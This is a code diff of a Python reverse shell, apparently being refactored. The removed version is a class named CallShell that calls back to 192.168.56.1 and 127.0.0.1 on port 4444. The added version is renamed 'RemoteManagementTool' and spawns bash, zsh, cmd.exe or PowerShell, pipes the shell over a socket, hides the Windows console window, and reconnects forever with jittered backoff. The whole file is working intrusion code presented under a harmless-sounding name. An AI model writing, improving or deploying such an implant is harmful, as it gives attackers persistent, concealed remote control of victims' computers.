@@ -1,183 +1,244 @@
+#!/usr/bin/env python3
+
 import os
+import sys
 import socket
 import subprocess
 import threading
-import random
-import http.client
-import time
 import platform
-
-def get_os_type():
-    """Get normalized OS type"""
-    system = platform.system().lower()
-    
-    os_mapping = {
-        'windows': 'windows',
-        'linux': 'linux', 
-        'darwin': 'darwin',  # macOS
-        'openbsd': 'openbsd',
-        'freebsd': 'freebsd'
-    }
-    
-    return os_mapping.get(system, 'unknown')
-
-def find_shell(target_platform: str = "") -> str:
-    """Find available shell for the platform"""
-    
-    current_os = target_platform or get_os_type()
-    
-    shell_preferences = {
-        'windows': [
-            os.path.join(os.environ.get('SYSTEMROOT', 'C:\\Windows'), 'System32', 'cmd.exe'),
-            'cmd.exe'  # Fallback to PATH
-        ],
-        'linux': ['/bin/zsh', '/bin/bash', '/bin/dash', '/bin/sh'],
-        'darwin': ['/bin/zsh', '/bin/bash', '/bin/sh'],
-        'openbsd': ['/bin/zsh', '/bin/ksh', '/bin/sh']
-    }
-    
-    if current_os not in shell_preferences:
-        raise ValueError(f"Unsupported OS: {current_os}")
-    
-    # Check user's preferred shell first (Unix-like)
-    if current_os != 'windows':
-        user_shell = os.environ.get('SHELL')
-        if user_shell and os.path.isfile(user_shell) and os.access(user_shell, os.X_OK):
-            return user_shell
-    
-    # Try shells in order of preference
-    for shell in shell_preferences[current_os]:
-        if os.path.isfile(shell) and os.access(shell, os.X_OK):
-            return shell
-    
-    raise RuntimeError(f"No suitable shell found for {current_os}")
+import time
+import signal
+import random
+import shutil
+from threading import Lock
 
 
-class CallShell:
-    def __init__(self, ippassedPassed, portpassedPassed: str=4444, opsysPassed: str=""):
-        self.strIP = ippassedPassed
-        self.intPort = portpassedPassed
-        self.strOpSys = opsysPassed
+class RemoteManagementTool:
+    def __init__(self, host, port, platform_override=""):
+        self.host = host
+        self.port = port
+        self.platform_override = platform_override
+        self.running = True
+        self.sock = None
+        self.proc = None
+        self.sock_lock = Lock()
 
-    def receive_output(self, object_socket_passed, object_popenPassed):
+    def get_os_type(self):
+        return platform.system().lower()
+
+    def find_command_interface(self):
+        os_type = self.platform_override or self.get_os_type()
+
+        interpreters = {
+            'windows': ['powershell.exe', 'cmd.exe'],
+            'linux': ['zsh', 'bash', 'dash', 'sh'],
+            'darwin': ['zsh', 'bash', 'sh'],
+            'openbsd': ['ksh', 'sh'],
+            'freebsd': ['sh', 'csh']
+        }
+
+        if os_type not in interpreters:
+            raise ValueError(f"Unsupported OS: {os_type}")
+
+        for interp in interpreters[os_type]:
+            path = shutil.which(interp)
+            if path:
+                return path
+
+        raise RuntimeError(f"No suitable command interface found for {os_type}")
+
+    def receive_input(self):
         try:
-            while True:
-                objData = object_socket_passed.recv(1024)
-                if not objData:
-                    break  # Connection closed
-                object_popenPassed.stdin.write(objData)
-                object_popenPassed.stdin.flush()
-        except Exception as e:
-            print(f"[!] receive_output error: {e}")
-        finally:
-            object_socket_passed.close()
+            while self.running:
+                with self.sock_lock:
+                    if not self.sock:
+                        break
+                    try:
+                        data = self.sock.recv(1024)
+                    except OSError:
+                        break
 
-    def send_input(self, object_socket_passed, object_popenPassed):
-        try:
-            while True:
-                data = object_popenPassed.stdout.read(1)
                 if not data:
+                    print("[DEBUG] Socket closed by remote in receive_input.")
                     break
-                object_socket_passed.send(data)
+
+                decoded = data.decode('utf-8')
+                if os.name == 'nt':
+                    decoded = decoded.replace('\n', '\r\n')  # Ensure proper line endings
+
+                print(f"[DEBUG] Received input: {repr(decoded)}")  # Debugging
+                self.proc.stdin.write(decoded)
+                self.proc.stdin.flush()
         except Exception as e:
-            print(f"[!] send_input error: {e}")
+            print(f"[!] Error in input thread: {e}")
         finally:
-            object_socket_passed.close()
+            self.running = False
 
 
-    def run_thread(self, strStage: str="receive"):
-        if "receive" == strStage: 
-            object_thread = threading.Thread(target=self.receive_output, args=self.listArgs)
-        elif "send" == strStage:
-            object_thread = threading.Thread(target=self.send_input, args=self.listArgs)
-        object_thread.daemon = True
-        object_thread.start()
-    def monitor_connection(self, sock, proc):
-        """Monitors the connection, and kills the shell if the socket dies"""
+
+    def send_output(self):
         try:
-            while True:
-                time.sleep(1)
-                # Check if process has exited
-                if proc.poll() is not None:
-                    print("[*] Shell process exited (monitor)")
+            while self.running:
+                line = self.proc.stdout.readline()
+                if not line:
                     break
+                self.safe_send(line)
+        except Exception as e:
+            print(f"[!] Error in output thread: {e}")
+        finally:
+            self.running = False
 
-                # Check socket connection (dummy send)
+    def safe_send(self, data):
+        with self.sock_lock:
+            try:
+                if not self.sock:
+                    print("[DEBUG] Socket is None in safe_send.")
+                    return
+                if not isinstance(self.sock, socket.socket):
+                    print(f"[DEBUG] self.sock is not a socket: {type(self.sock)}")
+                    return
+                if self.sock.fileno() == -1:
+                    print("[DEBUG] Socket file descriptor is invalid (closed).")
+                    return
+                if isinstance(data, str):
+                    data = data.encode('utf-8')
+                self.sock.sendall(data)
+            except (BrokenPipeError, ConnectionResetError, OSError) as e:
+                print(f"[!] Socket send error: {e}")
+                self.running = False
                 try:
-                    sock.send(b'\x00')  # harmless ping
-                except socket.error as e:
-                    print(f"[!] Socket appears dead: {e}")
-                    break
+                    self.sock.close()
+                except Exception as close_err:
+                    print(f"[!] Error closing socket: {close_err}")
+                self.sock = None
 
-        finally:
-            try:
-                proc.kill()
-            except: pass
-            try:
-                sock.close()
-            except: pass
-
-    def start_shell(self):
+    def launch_command_interface(self, executable_path):
         try:
-            object_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            object_socket.connect((self.strIP, self.intPort))
-            shell_string = find_shell(self.strOpSys)
-            print(f"[+] Launching shell: {shell_string}")
+            if os.name == 'nt':
+                si = subprocess.STARTUPINFO()
+                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 
-            if "/" in shell_string:
-                object_popen = subprocess.Popen(
-                    [shell_string],
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.STDOUT,
-                    stdin=subprocess.PIPE
-                )
-            else:
-                object_popen = subprocess.Popen(
-                    [shell_string],
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.STDOUT,
+                proc = subprocess.Popen(
+                    [executable_path],
                     stdin=subprocess.PIPE,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.STDOUT,
+                    text=True,
+                    encoding='utf-8',
+                    bufsize=1,
+                    startupinfo=si,
                     creationflags=subprocess.CREATE_NO_WINDOW
                 )
-
-            self.listArgs = [object_socket, object_popen]
-            self.run_thread("receive")
-            self.run_thread("send")
-
-            # Add monitor thread to catch broken connections
-            threading.Thread(
-                target=self.monitor_connection, 
-                args=(object_socket, object_popen), 
-                daemon=True
-            ).start()
-
-            # Wait until process ends (naturally or via monitor)
-            while object_popen.poll() is None:
-                time.sleep(0.5)
-
+            else:
+                proc = subprocess.Popen(
+                    [executable_path],
+                    stdin=subprocess.PIPE,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.STDOUT,
+                    text=True,
+                    encoding='utf-8',
+                    bufsize=1  # line-buffered
+                )
+            return proc
         except Exception as e:
-            print(f"[!] start_shell exception: {e}")
+            print(f"[!] Failed to start command interface: {e}")
+            return None
+
+    def configure_keepalive(self):
+        try:
+            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+
+            if sys.platform.startswith("linux"):
+                self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
+                self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
+                self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
+            elif sys.platform == "darwin":
+                TCP_KEEPALIVE = 0x10
+                self.sock.setsockopt(socket.IPPROTO_TCP, TCP_KEEPALIVE, 60)
+        except Exception as e:
+            print(f"[!] Error setting keepalive: {e}")
+
+    def start(self, sock_timeout=-1):
+        try:
+            print(f"[*] Connecting to {self.host}:{self.port}...")
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+            if sock_timeout != -1:
+                self.sock.settimeout(sock_timeout)
+
+            self.sock.connect((self.host, self.port))
+            print("[DEBUG] Socket connected.")
+            self.configure_keepalive()
+        except Exception as e:
+            print(f"[!] Connection failed: {e}")
+            return
+
+        try:
+            interface_path = self.find_command_interface()
+            print(f"[+] Using command processor: {interface_path}")
+        except Exception as e:
+            print(f"[!] Interface detection failed: {e}")
+            self.cleanup_socket()
+            return
+
+        self.proc = self.launch_command_interface(interface_path)
+        if not self.proc:
+            self.cleanup_socket()
+            return
+
+        recv_thread = threading.Thread(target=self.receive_input, daemon=True)
+        send_thread = threading.Thread(target=self.send_output, daemon=True)
+
+        recv_thread.start()
+        send_thread.start()
+
+        try:
+            self.proc.wait()
+        except KeyboardInterrupt:
+            print("[*] Terminated by user.")
+            self.running = False
+            self.proc.terminate()
         finally:
-            try:
-                object_popen.kill()
-            except: pass
-            try:
-                object_socket.close()
-            except: pass
+            recv_thread.join()
+            send_thread.join()
+            self.cleanup_socket()
+
+    def cleanup_socket(self):
+        with self.sock_lock:
+            if self.sock:
+                try:
+                    self.sock.close()
+                except Exception as e:
+                    print(f"[!] Error during socket cleanup: {e}")
+                self.sock = None
+
+def signal_handler(sig, frame):
+    print("[*] Signal received, exiting...")
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)
+try:
+    signal.signal(signal.SIGTERM, signal_handler)
+except AttributeError:
+    pass  # Not supported on Windows
 
 
-while True:
-    try:
-        print("[*] Attempting shell to 192.168.56.1...")
-        CallShell("192.168.56.1", 4444).start_shell()
-    except Exception as e:
-        print(f"[!] Shell to 192.168.56.1 failed: {e}")
-    try:
-        print("[*] Attempting shell to 127.0.0.1...")
-        CallShell("127.0.0.1", 4444).start_shell()
-    except Exception as e:
-        print(f"[!] Shell to 127.0.0.1 failed: {e}")
+def reconnect_loop(ip, port, platform_override=""):
+    delay = 10
+    max_delay = 300
 
-    print("[*] Sleeping before retry...")
-    time.sleep(20)
+    while True:
+        try:
+            client = RemoteManagementTool(ip, port, platform_override)
+            client.start()
+        except Exception as e:
+            print(f"[!] Session error: {e}")
+        print(f"[*] Reconnecting in {delay:.2f} seconds...")
+        time.sleep(delay)
+        delay = min(delay * 2, max_delay)
+        delay += random.uniform(0.5, 2.0)  # jitter
 
+if __name__ == "__main__":
+    LHOST = "127.0.0.1"
+    LPORT = 43249
+    reconnect_loop(LHOST, LPORT)
